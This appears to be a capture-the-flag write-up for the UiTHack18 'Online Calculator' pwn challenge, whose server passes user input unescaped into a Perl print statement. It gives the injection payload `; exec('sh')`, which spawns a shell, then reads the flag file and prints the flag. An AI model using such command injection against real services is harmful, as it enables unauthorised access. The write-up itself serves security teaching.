# Online Calculator

> > Pwn - 200pts
> 
> I have made this super cool online calculator so you don't have to use python or the built-in calculator of your operating system.
> 
> You can find it and test it out at: \<insert\_ip\_here\>:\<insert\_port\_here\>
> 
> PS: it is running over raw TCP, so connect using `nc <ip> <port>`
> 
> File: \<insert\_link\_to\_file\>

## Writeup

After tracing, reversing or otherwise getting some knowledge of what the server does,
we see the input is simply handed over to perl as such: `perl -e 'print <user_input>'`

This means that we can get a reverse shell by executing a new command in perl by terminating the print statement with something like `; exec('sh')`

Yielding the shell command;

```
perl -e 'print ; exec('sh')
```

This will give the user a shell, and the flag can be read:

```
cat flag
UiTHack18{Repeat_after_me:I_will_not_pass_user_input_to_an_interpreter!}
```

Yielding the flag:

```
UiTHack18{Repeat_after_me:I_will_not_pass_user_input_to_an_interpreter!}   
```
